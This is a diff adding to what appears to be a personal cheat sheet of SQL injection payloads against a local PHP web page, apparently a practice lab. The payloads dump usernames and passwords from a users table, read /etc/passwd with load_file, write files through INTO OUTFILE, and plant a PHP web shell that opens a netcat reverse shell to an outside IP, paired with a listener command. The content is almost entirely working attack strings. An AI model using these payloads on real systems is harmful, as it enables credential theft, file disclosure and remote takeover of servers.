@@ -41,3 +41,15 @@ http://localhost:8080/room_information.php?id=1%27+UniOn+selEct+1%2Ccolumn_name%
 1' UniOn selEct username,password,last_name frOm users #
 http://localhost:8080/room_information.php?id=1%27+UniOn+selEct+username%2Cpassword%2Clast_name+frOm+users+%23&Submit=Submit#
 
+
+
+-------------------------------- load file:
+
+1' union select 1,load_file('/etc/passwd'),2 #
+
+--------------------------------- output file:
+1' union select 1,load_file('/etc/passwd'),2 into outfile '/tmp/output_file.txt' #
+
+---------------------------------- connect and run a backdoor or nc command: run the listener: nc -vv -l -p 8080
+
+1' union select '<?passthru("nc -e /bin/sh 192.169.0.1 8080");?>',null,null into outfile '/tmp/reverse.php' #
